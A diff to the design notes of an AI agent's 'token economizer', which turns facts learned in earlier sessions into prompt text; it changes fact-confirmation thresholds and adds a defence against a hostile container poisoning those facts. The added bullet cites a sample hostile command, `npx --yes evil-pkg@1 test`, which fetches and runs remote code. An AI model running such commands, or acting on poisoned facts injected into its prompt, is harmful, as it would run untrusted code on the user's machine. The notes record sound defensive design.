@@ -105,7 +105,7 @@ The output text itself never leaves the container. The regex tables come from up
 
 **Detectors differ from upstream.** Upstream lets the model write Python regexes that run with no time limit. Here a detector is structured data: a scope, a confirm and a contradict clause, each built from named predicates and literal substrings. The machine checks it against the cited digests before it admits the fact.
 
-**Lifecycle.** A candidate is active after 3 confirming runs. A proposed fact needs runs that edited different files. A fact is stated only while at least 4 runs exercised it and it fired in 40% of them. It retires when its score goes below zero, with a contradiction weighted five times and a decay of 0.8. `retired` is final.
+**Lifecycle.** A candidate is active after 3 confirming runs. A proposed fact needs runs that edited different files. A fact is stated only while at least 4 runs exercised it, it fired in 40% of them and 2 distinct cards confirmed it. It retires when its score goes below zero, with a contradiction weighted five times and a decay of 0.8. `retired` is final.
 
 **Injection.** `StageInput.context.economy.facts` holds the rendered lines. `core/render.ts` appends them to the stage prompt as a data block under upstream's header, `# environment facts learned from earlier sessions in this repository`. The block has at most 4 free facts and 150 tokens. Proposed facts get the second header and the same lint, which upstream leaves out: a line that reads as completion or verification advice is refused. Fact text is built from templates. The only foreign text in it is a command spelling, limited to a plain character set.
 
@@ -215,6 +215,7 @@ The port landed on `feat/token-economizer` as the commits that the Rollout lists
 - **The ledger prices overhead that the runtime did not count.** A `loop_judge`, `loop_redirect` or `fact_propose` run with no token count keeps its cost in dollars. It counts in `overheadUnpriced`, so `overhead` is a floor.
 - **`GET /metrics` has an `economy` section.** It holds effective tokens for work and overhead and the overhead share. It also holds the redirects and stops, the active and promoted facts and the masked units. It is absent for `repo=` with no repository.
 - **`loop_judge` has no measured default.** The design promised an entry in `decision-defaults.json` and a scorecard. The pack has nine eval cases and is in the `UNMEASURED` list of `contracts/src/decision-defaults.test.ts`. So it runs on Jev by default, with Claude as the fallback. Nobody has run a baseline for it.
+- **A fact's command is checked on the host, and two cards must confirm a fact.** The container is untrusted, so the character set was not enough: it spells `npx --yes evil-pkg@1 test`. The observer's word lists now live in `contracts/src/economy-vocabulary.ts`. `knownForm` accepts only a spelling the observer could write. The machine applies it when it forms a fact and again when it renders one. A fact is stated only after 2 distinct cards confirmed it (`FIRE_MIN_CARDS`), so one hostile card's retries cannot state a fact.
 
 ### Not verified live
 
